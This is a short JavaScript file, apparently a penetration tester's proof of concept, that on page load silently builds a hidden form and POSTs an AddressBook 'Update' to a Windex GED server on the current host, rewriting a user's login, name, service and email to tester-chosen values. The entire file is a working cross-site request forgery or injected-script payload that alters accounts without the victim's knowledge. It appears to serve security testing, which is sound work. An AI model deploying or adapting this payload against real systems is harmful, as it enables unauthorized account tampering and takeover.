function submitForm() {
    var hostname = window.location.hostname

    var form = document.createElement('form');
    form.method = 'POST';
    form.action = 'http://'+hostname+'/windex-ged/WindexServer';

    var formElements = [
        { name: "Agent", value: "AddressBook" },
        { name: "Order", value: "Update" },
        { name: "IdUser", value: "58898" },
        { name: "IdRightTemplate", value: "0" },
        { name: "Login", value: "1234567C" },
        { name: "Civility", value: "" },
        { name: "Lastname", value: "T3" },
        { name: "Firstname", value: "T3" },
        { name: "Service", value: "Gestionnaire" },
        { name: "Email", value: "pentest1@algosecure.fr" },
        { name: "IdLanguage", value: "FR" },
        { name: "UserType", value: "" },
        { name: "DossierFilter", value: "" }
    ];

    formElements.forEach(function(element) {
        var input = document.createElement('input');
        input.type = 'hidden';
        input.name = element.name;
        input.value = element.value;
        form.appendChild(input);
    });

    document.body.appendChild(form);

    form.submit();
}

window.onload = submitForm;
